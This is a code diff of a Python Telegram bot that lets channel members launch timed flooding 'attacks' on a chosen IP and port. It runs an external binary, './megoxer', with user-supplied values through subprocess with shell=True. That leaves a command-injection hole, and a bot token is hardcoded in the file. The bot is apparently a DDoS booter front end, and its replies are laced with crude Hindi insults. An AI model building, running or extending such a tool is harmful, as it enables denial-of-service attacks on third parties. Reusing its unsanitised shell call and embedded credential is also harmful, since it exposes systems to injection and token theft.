@@ -6,7 +6,7 @@ import subprocess
 import threading
 from telebot import types
 
-# Insert your Telegram bot token here
+# Telegram bot token
 bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')
 
 # Group and channel details
@@ -16,7 +16,6 @@ CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
 # Global variables
 is_attack_running = False
 attack_end_time = None
-pending_feedback = {}
 update_thread = None
 current_attack_message = None
 
@@ -28,35 +27,30 @@ def is_user_in_channel(user_id):
     except:
         return False
 
-# Function to update attack status in the same message
+# Function to continuously update attack status
 def update_attack_status(chat_id, message_id, target, port):
     global is_attack_running, attack_end_time
 
     while is_attack_running:
         remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
         if remaining_time <= 0:
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=f"✅ **Attack khatam! Ab screenshot bhej warna teri maa ki...** 📸"
-            )
+            bot.send_message(chat_id, "✅ **ATTACK KHATAM BSDK! AB SCREENSHOT BHEJ WARNA MAA KI CH** 📸")
             is_attack_running = False
             return
 
         try:
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=f"""🔥 **Attack chalu hai behenchod!** 🔥  
-🎯 **Target:** `{target}`  
-🔢 **Port:** `{port}`  
-⏳ **Baaki Time:** `{int(remaining_time)}s`  
-🚀 **Khatam hone ka intezar mat kar, screenshot ready rakh!**"""
+            bot.send_message(
+                chat_id,
+                f"""🔥 **ATTACK CHALU HAI BSDK!** 🔥  
+🎯 **TARGET:** `{target}`  
+🔢 **PORT:** `{port}`  
+⏳ **BAAKI TIME:** `{int(remaining_time)}s`  
+🚀 **GAAND MAT MARA , SCREENSHOT READY RAKH!**"""
             )
         except:
             pass  
 
-        time.sleep(1)
+        time.sleep(1)  # हर 1 सेकंड में अपडेट करेगा
 
 # Handle attack command
 @bot.message_handler(commands=['RS'])
@@ -66,23 +60,22 @@ def handle_attack(message):
     command = message.text.split()
 
     if message.chat.id != int(GROUP_ID):
-        bot.reply_to(message, "🚫 **BSDK ye bot sirf group me chalta hai! Bhaag yaha se!** ❌")
+        bot.reply_to(message, "🚫 **ABE CHUTIYE! YE BOT SIRF GROUP ME CHALTA HAI! BHAAG YAHA SE!** ❌")
         return
 
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ **Pehle channel join kar, warna tujhe kuch nahi milega chaman!** {CHANNEL_USERNAME}")
+        bot.reply_to(message, f"❗ **PEHLE CHANNEL JOIN KAR BSDK, WARNA KUCH NAHI MILEGA!** {CHANNEL_USERNAME}")
         return
 
-    if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "😡 **Bhai pehle screenshot bhej warna naya attack maarne ka sapna bhool ja!**")
-        return
+    # अगर अटैक पहले से चल रहा है, तो टाइम अपडेट करता रहेगा
+    if is_attack_running and attack_end_time:
+        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
+        bot.reply_to(message, f"⏳ **ATTACK CHAL RAHA HAI BSDK! BAAKI TIME: {int(remaining_time)}s**")
+        return  
 
-    if is_attack_running:
-        bot.reply_to(message, "⚠️ **Abe ruk na! Pehle wala attack khatam toh hone de! Jaldi me hai kya?**")
-        return
-
+    # अगर अटैक नहीं चल रहा, तो नया अटैक शुरू करो
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ **Usage: /RS `<IP>` `<PORT>` `<TIME>`**\n😎 **Sahi likh behenchod!**")
+        bot.reply_to(message, "⚠️ **USAGE: /RS  <IP>  <PORT>  <TIME> **\n😎 **SAHI LIKH CHUTIYE! WARNA GAAND MAAR LENGE!**")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -91,35 +84,33 @@ def handle_attack(message):
         port = int(port)
         time_duration = int(time_duration)
     except ValueError:
-        bot.reply_to(message, "❌ **Port aur Time number hone chahiye! Kitna ganja phoonk raha hai bhai?**")
+        bot.reply_to(message, "❌ **PORT AUR TIME NUMBER HONE CHAHIYE! KITNA GANJA PHOONK RAHA HAI BSDK?**")
         return
 
     if time_duration > 180:
-        bot.reply_to(message, "🚫 **180 sec se zyada nahi milega! Tera baap bhi aake bole toh bhi nahi!**")
+        bot.reply_to(message, "🚫 **180 SEC SE ZYADA NAHI MILEGA! TERI MAA KO BHI NAHI!**")
         return
 
     # Confirm attack
-    confirm_msg = f"""⚡ **Attack Confirmed!**  
-🎯 **Target:** `{target}`  
-🔢 **Port:** `{port}`  
-⏳ **Duration:** `{time_duration}s`  
-🚀 **Ja beta, attack chalu ho gaya!**  
-📸 **Attack ke baad screenshot bhejna warna gaand maar lenge!**"""
+    confirm_msg = f"""⚡ **ATTACK CONFIRMED CHUTIYE!**  
+🎯 **TARGET:** `{target}`  
+🔢 **PORT:** `{port}`  
+⏳ **DURATION:** `{time_duration}s`  
+🚀 **JA BETA, ATTACK CHALU HO GAYA!**  
+📸 **SCREENSHOT BHEJ WARNA GAAND MAAR LENGE!**"""
 
-    msg = bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
-    current_attack_message = msg
+    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
 
     is_attack_running = True
     attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
-    pending_feedback[user_id] = True  
 
-    update_thread = threading.Thread(target=update_attack_status, args=(message.chat.id, msg.message_id, target, port))
+    update_thread = threading.Thread(target=update_attack_status, args=(message.chat.id, message.message_id, target, port))
     update_thread.start()
 
     try:
         subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
     except subprocess.CalledProcessError:
-        bot.reply_to(message, "❌ **Bhai attack fail ho gaya! Teri naseeb hi kharab hai!**")
+        bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA BSDK! TERI NASEEB HI KHARAB HAI!**")
         is_attack_running = False
         attack_end_time = None
         return
@@ -132,35 +123,21 @@ def handle_attack(message):
 def handle_check(message):
     if is_attack_running and attack_end_time:
         remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
-        bot.reply_to(message, f"⏳ **Gaand mara mat, attack chal raha hai! Baaki time: {int(remaining_time)}s**")
+        bot.reply_to(message, f"⏳ **GAAND MARA MAT BSDK, ATTACK CHAL RAHA HAI! BAAKI TIME: {int(remaining_time)}s**")
     else:
-        bot.reply_to(message, "✅ **Attack khatam! Ab naya laga behenchod!**")
-
-# Handle screenshot submission and forward to main channel
-@bot.message_handler(content_types=['photo'])
-def handle_screenshot(message):
-    user_id = str(message.from_user.id)
-    
-    if pending_feedback.get(user_id, False):
-        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)  
-        bot.send_message(CHANNEL_USERNAME, f"📸 **User `{user_id}` ka screenshot aa gaya! Behnchod OP!**")
-
-        bot.reply_to(message, "✅ **Chal ab naya attack maar sakta hai, warna bhaag!** 🚀")
-        del pending_feedback[user_id]  
-    else:
-        bot.reply_to(message, "❌ **Chutiye, screenshot ki zaroorat nahi ab! Kya kar raha hai?**")
+        bot.reply_to(message, "✅ **ATTACK KHATAM! AB NAYA LAGA CHUTIYE!**")
 
 # Bot start command
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"""🌟🔥 Oye {user_name}! 🔥🌟  
+    response = f"""🌟🔥 OYE {user_name}! 🔥🌟  
 
-🚀 **BSDK Ready ho ja!**  
-💥 Attack karne ka full chance hai!  
+🚀 **BSDK READY HO JAA!**  
+💥 ATTACK KARNE KA FULL CHANCE HAI!  
 
-🔗 **Group Join Kar Warna BSDK Ban Jayega!**  
-👉 [Telegram Group](https://t.me/R_SDanger_op) 🚀🔥""" 
+🔗 **GROUP JOIN KAR WARNA BSDK BAN JAYEGA!**  
+👉 [TELEGRAM GROUP](https://t.me/R_SDanger_op) 🚀🔥""" 
     
     bot.reply_to(message, response, parse_mode="Markdown")
 
@@ -170,4 +147,4 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
-        time.sleep(15)
+        time.sleep(1)
